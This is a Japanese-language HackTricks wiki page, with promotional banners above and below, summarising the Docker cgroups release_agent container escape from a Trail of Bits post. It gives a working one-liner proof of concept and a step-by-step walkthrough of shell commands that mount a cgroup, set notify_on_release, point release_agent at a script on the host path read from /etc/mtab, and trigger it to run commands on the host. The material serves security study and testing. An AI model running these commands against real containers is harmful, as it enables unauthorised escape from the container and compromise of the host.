# Docker release\_agent cgroups escape

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する。
* **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>


**詳細については、[元のブログ投稿](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)を参照してください。** これは要約です：

元のPoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
証明コンセプト（PoC）は、`release_agent`ファイルを作成し、その呼び出しをトリガーして、コンテナホストで任意のコマンドを実行する方法を示しています。以下は、関連する手順の概要です：

1. **環境の準備:**
- `/tmp/cgrp`ディレクトリを作成して、cgroupのマウントポイントとして使用します。
- RDMA cgroupコントローラをこのディレクトリにマウントします。RDMAコントローラが存在しない場合は、代替として`memory` cgroupコントローラを使用することが推奨されています。
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **子Cgroupの設定:**
   - マウントされたcgroupディレクトリ内に "x" という名前の子Cgroupが作成されます。
   - "x" Cgroupのnotify_on_releaseファイルに1を書き込むことで、"x" Cgroupの通知が有効になります。
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **リリースエージェントの設定:**
- ホスト上のコンテナのパスは、/etc/mtab ファイルから取得されます。
- 次に、cgroupのrelease_agent ファイルが、取得したホストパスにある /cmd というスクリプトを実行するように設定されます。
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **/cmdスクリプトの作成と設定:**
- /cmdスクリプトはコンテナ内で作成され、ps auxを実行し、出力をコンテナ内の/outputというファイルにリダイレクトするように設定されます。ホスト上の/outputのフルパスが指定されます。
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **攻撃のトリガー:**
- "x"の子cgroup内でプロセスが開始され、すぐに終了します。
- これにより`release_agent`（/cmdスクリプト）がトリガーされ、ホストでps auxを実行し、出力をコンテナ内の/outputに書き込みます。
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見る
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**する。
* **ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出してください。

</details>
